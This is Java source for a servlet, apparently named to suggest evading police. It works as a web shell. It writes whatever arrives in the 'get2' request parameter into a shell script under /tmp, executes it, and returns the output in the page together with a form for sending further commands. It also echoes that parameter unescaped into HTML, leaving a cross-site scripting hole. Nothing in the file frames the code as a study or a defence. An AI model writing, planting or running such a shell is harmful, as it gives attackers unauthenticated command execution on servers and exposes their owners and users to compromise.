import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class nonPoliceServlet extends HttpServlet {

   public void init() throws ServletException {
   }

   public void doGet(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
        PrintWriter out = response.getWriter();

        try{
        switch(request.getParameter("get")){
                case "assemble":
                  File file = new File("/tmp/nonPoliceShell.sh");
                        file.createNewFile();
                  FileWriter output = new FileWriter("/tmp/nonPoliceShell.sh");
                  StringBuffer sb = new StringBuffer();
                        sb.append("#/bin/bash \n");
                        sb.append(request.getParameter("get2")+"> /tmp/text.txt \n");
                             output.write(sb.toString());
                        output.close();
        }
          Runtime.getRuntime().exec(new String[] {"sh",  "-c","/tmp//nonPoliceShell.sh"});

        File file = new File("/tmp/text.txt");
        FileReader fr=new FileReader(file);   
        BufferedReader br=new BufferedReader(fr);
        String line="";
        while((line=br.readLine())!=null)  {
          out.println("<sub>" + line + "</sub>"); 
        }

        file = new File("/tmp/text2.txt");
        fr = new FileReader(file);
        br = new BufferedReader(fr);
        while((line=br.readLine())!=null)  {
          out.println("<br><br>"+line + "<br><br><form action='/nonPoliceXML/nonPoliceServlet?get=assemble' method=GET><input id=get2 name=get2 rows=1 cols=20 value="+request.getParameter("get2")+"></input><input type=submit></input><input type=hidden name=get value=assemble></input></form></h1><br>");
        }

    }catch(Exception e){
        System.out.println(e.getMessage());
        out.println(e.getMessage());
        }
      response.setContentType("text/html");

   }


   public void destroy() {
   }
}
